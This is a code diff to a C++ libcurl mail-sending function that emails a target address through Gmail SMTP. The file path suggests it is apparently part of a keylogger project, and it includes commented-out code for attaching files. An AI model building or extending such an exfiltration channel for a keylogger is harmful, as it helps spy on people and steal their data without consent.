@@ -26,7 +26,6 @@ bool CurlMailSender::sendMail(const Mail& mail, const Credentials& credentials)
         return false;
     }
 
-    CURLcode res = CURLE_OK;
     struct curl_slist* recipients = NULL;
     struct upload_status upload_ctx;
 
@@ -37,7 +36,7 @@ bool CurlMailSender::sendMail(const Mail& mail, const Credentials& credentials)
 
     if (curl)
     {
-        static const char* pCACertFile = "C:\\repos\\keylogger\\curl-ca-bundle.crt";
+        static const char* pCACertFile = R"(C:\repos\keylogger\curl-ca-bundle.crt)";
         curl_easy_setopt(curl, CURLOPT_CAINFO, pCACertFile);
 
         curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
@@ -51,11 +50,20 @@ bool CurlMailSender::sendMail(const Mail& mail, const Credentials& credentials)
         recipients = curl_slist_append(recipients, mail.emailTargetAddress.c_str());
         curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
 
+        if (mail.attachment)
+        {
+            std::cerr << "File attachment not supported";
+//            curl_mime* mime = curl_mime_init(curl);
+//            curl_mimepart* part = curl_mime_addpart(mime);
+//            curl_mime_filedata(part, mail.attachment->c_str());
+//            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+        }
+
         curl_easy_setopt(curl, CURLOPT_READFUNCTION, readEmailPayload);
         curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
         curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
 
-        res = curl_easy_perform(curl);
+        CURLcode res = curl_easy_perform(curl);
 
         if (res != CURLE_OK)
         {
@@ -64,7 +72,6 @@ bool CurlMailSender::sendMail(const Mail& mail, const Credentials& credentials)
         }
 
         curl_slist_free_all(recipients);
-
         curl_easy_cleanup(curl);
     }
 
